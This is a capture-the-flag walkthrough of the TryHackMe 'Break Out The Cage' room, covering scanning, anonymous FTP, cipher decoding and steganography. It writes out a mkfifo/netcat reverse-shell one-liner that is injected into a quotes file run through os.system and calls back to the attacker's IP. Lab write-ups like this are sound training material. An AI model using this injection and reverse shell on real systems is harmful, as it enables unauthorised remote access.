# Break Out The Cage

![alt text](https://tryhackme-images.s3.amazonaws.com/room-icons/29ef13afaef5de5b8f1a27653f9d7a2d.jpeg)

## TryHackme easy [room](https://tryhackme.com/room/breakoutthecage1) 
# Recon
  - Nmap
    ```bash
    # Nmap 7.80 scan initiated Wed Jun 17 19:55:45 2020 as: nmap -A -T5 -oN nmap.txt -vv 10.10.38.120
    Increasing send delay for 10.10.38.120 from 0 to 5 due to 97 out of 241 dropped probes since last increase.
    Nmap scan report for 10.10.38.120
    Host is up, received conn-refused (0.23s latency).
    Scanned at 2020-06-17 19:55:45 +08 for 26s
    Not shown: 996 closed ports
    Reason: 996 conn-refused
    PORT   STATE    SERVICE REASON      VERSION
    21/tcp open     ftp     syn-ack     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.8.23.241
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 4
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn+KLEDP81/6ceCvdFeDrLFYWSWc6UnOmmpiNeXuyr+GRvE5Eff4DOeTbiEIcHQkkPcz2QXiOLd9SMjCEgAqmZiZE/mv1HJpQfmRLOufOlf9oZ1TIZf7ehKcVqX0W3nuQeC+M2wLBse2lGhovnTSaZKLKRjQCP2yD1EzND/xFA88oFpahvr6vJfyGOTADjc83AJq9n3Gnil4Nd88xNsIKTl01Mm9ikE/3n/XFbwzYa2bYJRVr+lWWRd+EU3sYTY80PQgBiw6ZPT0QCe0lQfmcgCqu4hC+t/kyfmMRlbtjN/yZJ0gCWeVVAV+A4NNgsOqFbXUT+c6ATzYNhBXRojJED
    |   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA3G1rdbZBOf44Cvz2YGtC5WhIHfHQhtShY8miCVHayvHM/9reA8VvLx9jBOa+iClhm/HairgvNV6pYV6Jg6MII=
    |   256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiTPEbVpYmF2d/NDdhVYlXWA5PmTHhtrtlAaTiEuZOj
    70/tcp filtered gopher  no-response
    80/tcp open     http    syn-ack     Apache httpd 2.4.29 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: POST OPTIONS HEAD GET
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Nicholas Cage Stories
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Wed Jun 17 19:56:11 2020 -- 1 IP address (1 host up) scanned in 26.18 seconds
    ```

# FTP
Loging in as anonymous on the ftp gave us access to a note called 'dad_tasks'
- /dad_tasks
   ```bash 
    UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
    ```
It's encoded with base64 so, when we decode it it will look like this
-  /dad_tasks.decodedbase64
    ```bash
    Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
    Sfw. Kajnmb xsi owuowge
    Faz. Tml fkfr qgseik ag oqeibx
    Eljwx. Xil bqi aiklbywqe
    Rsfv. Zwel vvm imel sumebt lqwdsfk
    Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.
    
    Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
    ```
Doing a little research, we can guess that it is vignere chiper, we will go back to this when we have the key. 
    
# Web Enum
 - Gobuster
    ```bash
    =====================================================
    Gobuster v2.0.1              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.192.254/
    [+] Threads      : 50
    [+] Wordlist     : /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Extensions   : php,html,txt
    [+] Timeout      : 10s
    =====================================================
    2020/06/17 21:50:25 Starting gobuster
    =====================================================
    /images (Status: 301)
    /index.html (Status: 200)
    /html (Status: 301)
    /scripts (Status: 301)
    /contracts (Status: 301)
    /auditions (Status: 301)
    ```
- /auditions
In this directory we can find an audio file. when we open it with [audacity](https://www.audacityteam.org/). we can see there's a hidden word in its spectogram.

# Weston

using the word found in the spectogram we can dechiper the vigenere chiper and get the password for weston
- Dechipered Text
    ```
    Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
    One. Revamp the website
    Two. Put more quotes in script
    Three. Buy bee pesticide
    Four. Help him with acting lessons
    Five. Teach Dad what "information security" is.
    
    In case I forget.... ************************************************
    ```
    
here we found that there is a ```wall``` message keep appearing from cage. By looking around a little, we will find there's a script doing that in 
```
/opt/.dad_scripts/
```
Here is the script called `spread_the_quotes.py`
```python
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```
From this we can see that it will broadcast message contained in the `.quotes` file.
we can try to put a reverse shell script inside it, so it will execute it as cage.
```bash
echo "lol;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.23.241 9001 >/tmp/f" > .quotes 
```
By waiting  for a few minutes we will get a shell as cage 
![alt text](https://i.imgur.com/UqSNz4e.png)

# Cage
- User Flag
The user flag is inside a file in cage's home directory. The file is called `Super_Duper_Checklist`

# Getting Root
There is a folder called `email_backup` inside cage's home directory, when we read the contents inside the folder we can see there are three emails
- email_1
    ```bash
    From - SeanArcher@BigManAgents.com
    To - Cage@nationaltreasure.com
    
    Hey Cage!
    
    There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
    planning stages at the moment. I've put a good word in for you, if you're lucky we 
    might be able to get you a part of an angry shop keeping or something? Would you be up
    for that, the money would be good and it'd look good on your acting CV.
    
    Regards
    
    Sean Archer
    ```
- email_2
  ```bash
  From - Cage@nationaltreasure.com
    To - SeanArcher@BigManAgents.com
    
    Dear Sean
    
    We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
    Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
    the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
    new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
    I could of made them great... great Sean.... I think you're missing my true potential.
    
    On a much lighter note thank you for helping me set up my home server, Weston helped too, but
    not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?
    
    Yours
    
    Cage
  ```
- email_3
    ```bash
    From - Cage@nationaltreasure.com
    To - Weston@nationaltreasure.com
    
    Hey Son
    
    Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
    down what it said. Could you look into it please? I think it could be something to do with his
    account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
    sure he's out to get me. The note said:
    
    haiinspsyanileph
    
    The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
    was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
    hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
    ahahahhahaha. Ahhh Face it... he's just odd. 
    
    Regards
    
    The Legend - Cage
    ```
From the latest email, we can see that there is a strings that looks like a chiper text. on the email, cage is mentioned that his agent is obsessed with his face.
From that information, we can try to dechiper it with viginere method.

The dechipered text can be used as the root password for the machine

- Root flag
    the root flag can be found inside one fo the file inside the `email_backup` folder.
    ```bash
    From - master@ActorsGuild.com
    To - SeanArcher@BigManAgents.com
    
    Dear Sean
    
    I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
    strong... so strong that I feel the power to promote you from disciple to crony. I hope you
    don't abuse your new found strength. To ascend yourself to this level please use this code:
    
    ***********************************
    
    Thank you
    
    Sean Archer
    ```
